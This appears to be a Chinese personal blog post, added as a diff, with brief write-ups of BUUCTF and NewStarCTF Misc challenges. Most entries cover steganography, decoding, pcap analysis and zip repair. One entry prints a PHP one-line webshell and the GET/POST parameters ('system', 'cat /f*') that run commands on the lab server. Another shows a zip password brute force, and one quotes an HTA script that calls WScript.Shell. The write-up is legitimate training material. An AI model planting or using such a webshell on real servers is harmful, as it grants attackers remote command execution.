@@ -1,0 +1,375 @@
+<!doctype html>
+<html lang="zh"><head>
+<title>BUUCTF篇-Misc部分题解 - 张岩的博客</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="CTF,web,北京理工大学,武钢三中,github,社会,文学,网络安全">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+<meta name="description" content="MISC1、[NewStarCTF 2023 公开赛道]机密图片zsteg 1zsteg secret.png 2、[NewStarCTF 2023 公开赛道]CyberChef’s Secret加密 1M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA&#x3D; cyber_chef 选择magi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF篇-Misc部分题解">
+<meta property="og:url" content="http://xxxkkk578.github.io/2024/04/10/CTF/buu_misc/index.html">
+<meta property="og:site_name" content="张岩的博客">
+<meta property="og:description" content="MISC1、[NewStarCTF 2023 公开赛道]机密图片zsteg 1zsteg secret.png 2、[NewStarCTF 2023 公开赛道]CyberChef’s Secret加密 1M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA&#x3D; cyber_chef 选择magi">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-04-09T16:25:43.000Z">
+<meta property="article:modified_time" content="2024-04-09T16:41:20.386Z">
+<meta property="article:author" content="张岩">
+<meta property="article:tag" content="CTF,Misc">
+<meta name="twitter:card" content="summary">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1712681513974">
+
+<link rel="stylesheet" href="/css/style.css?v=1712681513974">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1712681513974">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1712681513974"></script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.1.1"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://i.pinimg.com/474x/d5/20/a8/d520a8a9e2919f9beb22a2b31662df68.jpg)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="张岩"><img src="https://i.pinimg.com/474x/08/19/99/081999fe69573ae20e4fc32a4903973d.jpg" alt="张岩"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="张岩">
+            <img src="https://i.pinimg.com/474x/08/19/99/081999fe69573ae20e4fc32a4903973d.jpg" alt="张岩" alt="张岩">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>3</div>
+        <div><span>标签</span>3</div>
+        <div><span>分类</span>2</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        
+            <form id="search_form">
+                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+            </form>
+         
+    </div>
+</div>
+
+
+	<script async src="/js/search.js?v=1712681513975"></script>
+
+
+
+    
+        
+        
+        
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+   
+    <div class="nexmoe-copyright">
+        &copy; 2024 张岩
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: 62.5%;"> 
+            <img src="https://i.pinimg.com/474x/1c/02/9c/1c029c57dccd19a966280754e6cf3ea7.jpg" alt="BUUCTF篇-Misc部分题解" loading="lazy">
+            <h1>BUUCTF篇-Misc部分题解</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2024年04月10日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/CTF/">CTF</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1、-NewStarCTF-2023-公开赛道-机密图片"><a href="#1、-NewStarCTF-2023-公开赛道-机密图片" class="headerlink" title="1、[NewStarCTF 2023 公开赛道]机密图片"></a>1、[NewStarCTF 2023 公开赛道]机密图片</h3><p>zsteg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">zsteg secret.png<br></code></pre></td></tr></table></figure>
+<h3 id="2、-NewStarCTF-2023-公开赛道-CyberChef’s-Secret"><a href="#2、-NewStarCTF-2023-公开赛道-CyberChef’s-Secret" class="headerlink" title="2、[NewStarCTF 2023 公开赛道]CyberChef’s Secret"></a>2、[NewStarCTF 2023 公开赛道]CyberChef’s Secret</h3><p>加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=<br></code></pre></td></tr></table></figure>
+<p>cyber_chef 选择magic参数 即可获得flag</p>
+<h3 id="3、-NewStarCTF-2023-公开赛道-流量！鲨鱼！"><a href="#3、-NewStarCTF-2023-公开赛道-流量！鲨鱼！" class="headerlink" title="3、[NewStarCTF 2023 公开赛道]流量！鲨鱼！"></a>3、[NewStarCTF 2023 公开赛道]流量！鲨鱼！</h3><p>wireshark打开<br>导出http对象<br>使用cyber_chef magic解密</p>
+<h3 id="4、-NewStarCTF-2023-公开赛道-压缩包们"><a href="#4、-NewStarCTF-2023-公开赛道-压缩包们" class="headerlink" title="4、[NewStarCTF 2023 公开赛道]压缩包们"></a>4、[NewStarCTF 2023 公开赛道]压缩包们</h3><p>发现压缩包损坏 不见pk头<br>补上50 4B 03 04<br>解压得又一个压缩包<br>尝试解压 报错<br>查看zip文件时在备注发现一串base64编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==<br></code></pre></td></tr></table></figure>
+<p>解密后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">I like six-digit numbers because they are very concise and easy to remember.<br></code></pre></td></tr></table></figure>
+<p>说明密码六位 爆破即可<br>使用ziperello<br>破解得密码为<br>232311<br>banzip修复flag.zip<br>解压得到flag</p>
+<h3 id="5、-NewStarCTF-2023-公开赛道-隐秘的眼睛"><a href="#5、-NewStarCTF-2023-公开赛道-隐秘的眼睛" class="headerlink" title="5、[NewStarCTF 2023 公开赛道]隐秘的眼睛"></a>5、[NewStarCTF 2023 公开赛道]隐秘的眼睛</h3><p>图片上有很多小灰斑<br>使用silenteye解码即可</p>
+<h3 id="6、-NewStarCTF-2023-公开赛道-空白格"><a href="#6、-NewStarCTF-2023-公开赛道-空白格" class="headerlink" title="6、[NewStarCTF 2023 公开赛道]空白格"></a>6、[NewStarCTF 2023 公开赛道]空白格</h3><p>WhiteSpace是一种只用空白字符（空格，Tab，回车）编程的语言<br>在如下网站上可以解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://vii5ard.github.io/whitespace/<br></code></pre></td></tr></table></figure>
+<h3 id="7、-NewStarCTF-2023-公开赛道-永不消逝的电波"><a href="#7、-NewStarCTF-2023-公开赛道-永不消逝的电波" class="headerlink" title="7、[NewStarCTF 2023 公开赛道]永不消逝的电波"></a>7、[NewStarCTF 2023 公开赛道]永不消逝的电波</h3><p>摩斯密码加电波</p>
+<h3 id="8、-NewStarCTF-2023-公开赛道-base"><a href="#8、-NewStarCTF-2023-公开赛道-base" class="headerlink" title="8、[NewStarCTF 2023 公开赛道]base!"></a>8、[NewStarCTF 2023 公开赛道]base!</h3><p>base64隐写<br>使用如下脚本进行解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:gbk</span><br><span class="hljs-keyword">import</span> base64<br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><span class="hljs-comment">#在这一行我们的工作就是简单的做一个base64的参照表，后面会解释作用。</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;base.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        stegb64 = <span class="hljs-built_in">str</span>(line, <span class="hljs-string">&quot;utf-8&quot;</span>).strip(<span class="hljs-string">&quot;\r&quot;</span>).strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<span class="hljs-comment">#输出的时候好像还是有回车</span><br>        rowb64 = <span class="hljs-built_in">str</span>(base64.b64encode(base64.b64decode(stegb64)), <span class="hljs-string">&quot;utf-8&quot;</span>).strip(<span class="hljs-string">&quot;\r\n&quot;</span>)<span class="hljs-comment">#要加“utf-8”不加会报错</span><br>        equalnum = stegb64.count(<span class="hljs-string">&#x27;=&#x27;</span>)<br>        <span class="hljs-keyword">if</span> equalnum:<span class="hljs-comment">#刚刚从我们的分析过程中可以看到，如果在一串base64编码的字符串中，没有等号是不可能隐藏数据的，所以这里要判断一</span><br>            offset = <span class="hljs-built_in">abs</span>(b64chars.index(stegb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>])-b64chars.index(rowb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>]))<span class="hljs-comment">#这里要算一下偏移量，可能就这么说偏移量大家可能不是很懂，我就用简单通俗的话来讲吧。如果咱们不去隐写数据的话，最后补位的一定全是零，那么用咱们得到的隐写数据的二进制减去那些补位是零的二进制数据（他们两个的头部都是从前面继承的），那么就会得到咱们隐写进去的非零二进制数据。</span><br>            bin_str += <span class="hljs-built_in">bin</span>(offset)[<span class="hljs-number">2</span>:].zfill(equalnum * <span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)]))<br></code></pre></td></tr></table></figure>
+<p>之后再放入cyberchef magic解密 得到flag base58加密</p>
+<h3 id="9、-NewStarCTF-2023-公开赛道-WebShell的利用"><a href="#9、-NewStarCTF-2023-公开赛道-WebShell的利用" class="headerlink" title="9、[NewStarCTF 2023 公开赛道]WebShell的利用"></a>9、[NewStarCTF 2023 公开赛道]WebShell的利用</h3><p>php源码混淆解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>//加密方式：php源码混淆类加密。免费版地址:http://www.zhaoyuanma.com/phpjm.html 免费版不能解密,可以使用VIP版本。<br>//此程序由【找源码】http://Www.ZhaoYuanMa.Com (免费版）在线逆向还原，QQ：7530782 <br>?&gt;<br>&lt;?php<br>error_reporting(0);($_GET[&#x27;7d67973a&#x27;])($_POST[&#x27;9fa3&#x27;]);<br>?&gt;<br></code></pre></td></tr></table></figure>
+<p>则结合题目</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">我们在服务器上发现了一个奇奇怪怪的WebShell，研究一下如何利用它去获取服务器权限吧（index.php即为WebShell，直接交互即可）<br></code></pre></td></tr></table></figure>
+<p>传参即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://3446ac3e-a9f6-4edf-8bd9-e663aa1a4b0a.node5.buuoj.cn:81/index.php?7d67973a=system<br></code></pre></td></tr></table></figure>
+<p>POST参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">9fa3=cat /f*<br></code></pre></td></tr></table></figure>
+<h3 id="10、-NewStarCTF-2023-公开赛道-1-序章"><a href="#10、-NewStarCTF-2023-公开赛道-1-序章" class="headerlink" title="10、[NewStarCTF 2023 公开赛道]1-序章"></a>10、[NewStarCTF 2023 公开赛道]1-序章</h3><p>编写如下python脚本利用日志</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;access.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).readlines()<br>s = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">3523</span>):<br>	data = urllib.parse.unquote(f[i])<span class="hljs-comment">#url解码</span><br>	payload = data.split(<span class="hljs-string">&quot;or&quot;</span>)[<span class="hljs-number">2</span>]<span class="hljs-comment">#截取and后面的字符</span><br>	number = payload.find(<span class="hljs-string">&quot;from user),&quot;</span>)<span class="hljs-comment">#确定大概的位置</span><br>	data1 = payload[number+ <span class="hljs-number">11</span>:].split(<span class="hljs-string">&quot;,&quot;</span>)[<span class="hljs-number">0</span>]<span class="hljs-comment">#取第一个数据</span><br>	data2 = payload[number + <span class="hljs-number">11</span>:].split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;,&quot;</span>)[<span class="hljs-number">0</span>]<span class="hljs-comment">#取&gt;后的数据</span><br>	s.append([data1,data2])<br>	<br> <br><span class="hljs-comment">#转码输出</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(s)):<br>    <span class="hljs-keyword">if</span> (s[i][<span class="hljs-number">0</span>] != s[i-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]):<br>       <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(s[i-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>])),end=<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">#输出变化前的最后一个字符</span><br><br></code></pre></td></tr></table></figure>
+<h3 id="11、-NewStarCTF-2023-公开赛道-Jvav"><a href="#11、-NewStarCTF-2023-公开赛道-Jvav" class="headerlink" title="11、[NewStarCTF 2023 公开赛道]Jvav"></a>11、[NewStarCTF 2023 公开赛道]Jvav</h3><p>java盲水印 使用blindwatermark工具加上隐藏的水印</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">java -jar .\BlindWatermark-v0.0.3-windows-x86_64.jar decode -c .\challenge.png 1.png<br></code></pre></td></tr></table></figure>
+<h3 id="12、-NewStarCTF-2023-公开赛道-新建Word文档"><a href="#12、-NewStarCTF-2023-公开赛道-新建Word文档" class="headerlink" title="12、[NewStarCTF 2023 公开赛道]新建Word文档"></a>12、[NewStarCTF 2023 公开赛道]新建Word文档</h3><p>word里啥也没有<br>另存为xml文件可以看到内容<br>再复制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">新佛曰：毘諸隸僧降吽諸陀摩隸僧缽薩願毘耨咤陀願羅咤喃修願宣亦宣寂叻寂阿是吽阿塞尊劫毘般毘所聞降毘咒塞尊薩咒毘所若降般斯毘嚴毘嚴波斯迦毘色毘波嚴毘喃念若修嘚般毘我毘如毘如囑囑<br></code></pre></td></tr></table></figure>
+<p>出来到 新约佛论禅 佛曰解密即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://hi.pcmoe.net/buddha.html<br></code></pre></td></tr></table></figure>
+<h3 id="13、-V-N2020-公开赛-拉胯的三条命令"><a href="#13、-V-N2020-公开赛-拉胯的三条命令" class="headerlink" title="13、[V&amp;N2020 公开赛]拉胯的三条命令"></a>13、[V&amp;N2020 公开赛]拉胯的三条命令</h3><p>tcp三次握手 在kali上运行如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tcpdump -n -r nmapll.pcapng &#x27;tcp[13] = 18&#x27; | awk &#x27;&#123;print $3&#125;&#x27; | sort -u<br></code></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">reading from file nmapll.pcapng, link-type EN10MB (Ethernet), snapshot length 262144<br>127.0.0.1.21<br>127.0.0.1.22<br>127.0.0.1.3306<br>127.0.0.1.631<br>127.0.0.1.801<br></code></pre></td></tr></table></figure>
+<p>则flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">flag&#123;21226318013306&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="14、-NewStarCTF-2023-公开赛道-隐秘的图片"><a href="#14、-NewStarCTF-2023-公开赛道-隐秘的图片" class="headerlink" title="14、[NewStarCTF 2023 公开赛道]隐秘的图片"></a>14、[NewStarCTF 2023 公开赛道]隐秘的图片</h3><p>放进stegsolve里<br>analyse<br>image combiner<br>将两张图片异或即可</p>
+<h3 id="15、-NewStarCTF-2023-公开赛道-Nmap"><a href="#15、-NewStarCTF-2023-公开赛道-Nmap" class="headerlink" title="15、[NewStarCTF 2023 公开赛道]Nmap"></a>15、[NewStarCTF 2023 公开赛道]Nmap</h3><p>限定tcp<br>分组列表 字符串 搜索</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SYN, ACK<br></code></pre></td></tr></table></figure>
+<p>记录source port即可</p>
+<h3 id="16、-NewStarCTF-2023-公开赛道-R通大残"><a href="#16、-NewStarCTF-2023-公开赛道-R通大残" class="headerlink" title="16、[NewStarCTF 2023 公开赛道]R通大残"></a>16、[NewStarCTF 2023 公开赛道]R通大残</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">zsteg secrect.png -a<br></code></pre></td></tr></table></figure>
+<h3 id="17、-NewStarCTF-2023-公开赛道-依旧是空白"><a href="#17、-NewStarCTF-2023-公开赛道-依旧是空白" class="headerlink" title="17、[NewStarCTF 2023 公开赛道]依旧是空白"></a>17、[NewStarCTF 2023 公开赛道]依旧是空白</h3><p>使用工具爆破图片宽高并修复获得密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">s00_b4by_f0r_y0u<br></code></pre></td></tr></table></figure>
+<p>snow隐写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SNOW.EXE -p s00_b4by_f0r_y0u -C White.txt<br></code></pre></td></tr></table></figure>
+<h3 id="18、-Dest0g3-520迎新赛-你知道js吗"><a href="#18、-Dest0g3-520迎新赛-你知道js吗" class="headerlink" title="18、[Dest0g3 520迎新赛]你知道js吗"></a>18、[Dest0g3 520迎新赛]你知道js吗</h3><p>wingding是字符 将字体切换为宋体之后 base64解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;<br>&lt;assembly xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; manifestVersion=&quot;1.0&quot;&gt;<br>&lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;<br>            &lt;requestedExecutionLevel level=&quot;asInvoker&quot; uiAccess=&quot;false&quot;/&gt;<br>&lt;application xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;<br>        &lt;dpiAwareness xmlns=&quot;http://schemas.microsoft.com/SMI/2016/WindowsSettings&quot;&gt;Do you know js&lt;/dpiAwareness&gt;<br>&lt;script language=&quot;javascript&quot;&gt;document.write(unescape(&#x27;%3Chtml%3E%0A%3Cbody%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Ctitle%3EDo%20You%20Know%20js%3C%2Ftitle%3E%0A%3CHTA%3AAPPLICATION%0A%20%20APPLICATIONNAME%3D%22Do%20You%20Know%20js%22%0A%20%20ID%3D%22Inception%22%0A%20%20VERSION%3D%221.0%22%0A%20%20SCROLL%3D%22no%22%2F%3E%0A%20%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%3C%2Fhead%3E%0A%20%20%20%20%3Cdiv%20id%3D%22feature%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22content%0A%09%09%09%09%3C%2Fstyle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20id%3D%22unavailable%22%20class%3D%22loading%22%3EBuilding%20js.....%3C%2Fh1%3E%0A%09%09%09%09%3Cscript%20type%3D%22text%2Fjavascript%22%20language%3D%22javascript%22%3E%0A%09%09%09%09%09function%20RunFile%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20WshShell%20%3D%20new%20ActiveXObject%28%22WScript.Shell%22%29%3B%0A%09%09%09%09%09WshShell.Run%28%22notepad%20%25windir%25%2FDesktop%2Fjs.txt%22%2C%201%2C%20false%29%3B%0A%20%20%20%20%20%20%20%20%20%20%2F*%20var%20oExec%20%3D%20WshShell.Exec%28%22notepad%22%29%3B%20*%2F%0A%09%09%09%09%09%7D%0A%09%09%09%09%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%3Cbody%3E%0A%09%3Cinput%20type%3D%22button%22%20value%3D%22Implant%20Inception%20Here%22%20onclick%3D%22RunFile%28%29%3B%22%2F%3E%0A%09%3Cp%20style%3D%22color%3Awhite%3B%22%3E%0A%0A%2B%2B%2B%2B%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B%2B..%20%2B%2B.-.%20%2B%2B.--%20--.%2B%2B%20%2B%2B.--%20%0A-.-.-%20--.%2B%2B%20%2B%2B%2B%2B.%0A%2B.---%20-..%2B%2B%20%2B%2B.%3C%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%5B-%20%0A%3E---%3C%20%5D%3E---%20---.%2B%20%2B%2B%2B%2B.%20-----%0A.%2B%2B%2B.%20...--%20---.%2B%20%2B%2B%2B%2B.%20---.%2B%20%2B%2B.--%20---.%2B%20%2B%2B%2B%2B.%20---..%20%2B%2B%2B%2B%2B%20%2B.---%20----.%0A%3C%2B%2B%2B%2B%20%5B-%3E%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B.%3C%2B%20%2B%2B%2B%5B-%20%3E----%20%3C%5D%3E-.%20---.%2B%0A%20%2B%2B%2B%2B%2B%20.----%20-.%2B%2B.%20%2B%2B.%2B.%0A--.--%20.%3C%2B%2B%2B%20%2B%5B-%3E%2B%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%2B%5B%20-%3E---%20-%3C%5D%3E-%20%0A.%2B.-.%20---.%2B%20%2B%2B.%2B.%20-.%2B%2B%2B%0A%2B.---%20--.%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20.%3C%2B%2B%2B%20%5B-%3E--%20-%3C%5D%3E-%20----.%20----.%20%2B.%2B%2B%2B%20%2B.---%0A-.---%20.%2B%2B%2B.%20-..%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20%0A.%3C%2B%2B%2B%20%2B%5B-%3E-%20---%3C%5D%20%3E-.%2B%2B%20%2B%2B%2B.-%20----.%0A%2B%2B%2B..%20---.%2B%20%2B%2B.--%20--.%2B.%20..%2B%2B%2B%20%2B.-.-%20----.%20%2B%2B%2B%2B%2B%20%0A.----%20.%2B.%2B%2B%20%2B%2B.--%20--.%2B%2B%0A%2B%2B.-.%20----.%20%2B.-.%2B%20%2B%2B%2B%2B.%20%0A%3C%2B%2B%2B%5B%20-%3E%2B%2B%2B%20%3C%5D%3E%2B%2B%20%2B%2B.%3C%0A%3C%2Fp%3E%0A%3C%2Fbody%3E%0A%3C%2Fbody%3E%0A%20%20%3C%2Fhtml%3E%0A&#x27;));&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>控制台</p>
